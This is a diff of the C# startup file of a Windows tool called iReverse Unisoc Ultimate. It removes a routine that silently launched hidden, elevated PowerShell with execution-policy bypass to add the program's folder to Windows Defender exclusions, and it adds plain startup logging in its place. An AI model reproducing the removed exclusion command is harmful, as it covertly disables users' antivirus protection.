@@ -1,45 +1,57 @@
 using System;
 using System.Diagnostics;
+using System.IO;
 using System.Windows.Forms;
 
 namespace iReverse_Unisoc_Ultimate
 {
     static class Program
     {
-        private static void AddExclusionWindowsDefender()
-        {
-            try
-            {
-                string regval = Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PowerShell\\1", "Install", null)?.ToString();
-                if (!string.IsNullOrEmpty(regval) && regval.Equals("1"))
-                {
-                    string dir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location);
-                    var elevated = new ProcessStartInfo("powershell")
-                    {
-                        UseShellExecute = true,
-                        CreateNoWindow = true,
-                        WindowStyle = ProcessWindowStyle.Hidden,
-                        Verb = "runas",
-                        Arguments = "-NoProfile -ExecutionPolicy Bypass -Command Add-MpPreference -ExclusionPath '" + dir + "'"
-                    };
-                    Process.Start(elevated);
-                }
-            }
-            catch
-            {
-                // Silently ignore if Defender exclusion fails or user rejects UAC
-            }
-        }
-        /// <summary>
-        /// The main entry point for the application.
-        /// </summary>
         [STAThread]
         static void Main()
         {
-            AddExclusionWindowsDefender();
-            Application.EnableVisualStyles();
-            Application.SetCompatibleTextRenderingDefault(false);
-            Application.Run(new Main());
+            string logPath = Path.Combine(Path.GetTempPath(), "iReverse_Startup.log");
+            try
+            {
+                File.WriteAllText(logPath, "=== iReverse Startup Log ===\n");
+                File.AppendAllText(logPath, DateTime.Now.ToString() + " - Starting...\n");
+
+                Application.EnableVisualStyles();
+                Application.SetCompatibleTextRenderingDefault(false);
+
+                File.AppendAllText(logPath, DateTime.Now.ToString() + " - Creating Main form...\n");
+                var mainForm = new Main();
+
+                File.AppendAllText(logPath, DateTime.Now.ToString() + " - Running application...\n");
+                Application.Run(mainForm);
+
+                File.AppendAllText(logPath, DateTime.Now.ToString() + " - Application exited normally.\n");
+            }
+            catch (Exception ex)
+            {
+                try
+                {
+                    File.AppendAllText(logPath, DateTime.Now.ToString() + " - FATAL ERROR:\n");
+                    File.AppendAllText(logPath, ex.ToString() + "\n");
+                    if (ex.InnerException != null)
+                    {
+                        File.AppendAllText(logPath, "INNER EXCEPTION:\n");
+                        File.AppendAllText(logPath, ex.InnerException.ToString() + "\n");
+                    }
+                }
+                catch { }
+
+                try
+                {
+                    MessageBox.Show(
+                        "Failed to start application.\n\nError: " + ex.Message + "\n\nCheck log at:\n" + logPath,
+                        "iReverse Unisoc Ultimate - Startup Error",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Error
+                    );
+                }
+                catch { }
+            }
         }
     }
 }
